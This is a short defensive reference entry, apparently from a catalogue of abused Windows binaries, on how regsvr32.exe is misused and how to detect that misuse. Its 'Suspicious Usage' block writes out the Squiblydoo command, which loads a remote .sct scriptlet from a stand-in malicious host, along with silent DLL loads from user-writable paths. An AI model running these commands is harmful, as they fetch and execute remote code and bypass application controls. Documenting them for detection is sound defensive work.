# regsvr32.exe — Microsoft Registered Server

## Description
Legitimate Microsoft-signed binary used to register and unregister DLLs and ActiveX controls in the Windows Registry.

## Abused For
- **Squiblydoo technique:** Load remote COM scriptlets (.sct files) from URLs
- **Silent DLL loading:** `/s` flag suppresses dialogs, `/i` flag specifies an install script
- **Bypassing AppLocker:** Regsvr32 is a trusted Microsoft binary

## Suspicious Usage
```
regsvr32.exe /s /u /i:http://malicious.com/payload.sct scrobj.dll
regsvr32.exe /s C:\Users\Public\malicious.dll
regsvr32.exe /s "C:\ProgramData\suspicious.dll"
```

## Normal Usage
```
regsvr32.exe /s C:\Windows\System32\msxml6.dll
regsvr32.exe /u C:\Windows\System32\vbscript.dll
```

## Detection Flags
- `/s` (silent) flag with remote URL
- Loading DLLs from user-writable paths (Temp, AppData, ProgramData)
- Network connections from regsvr32.exe
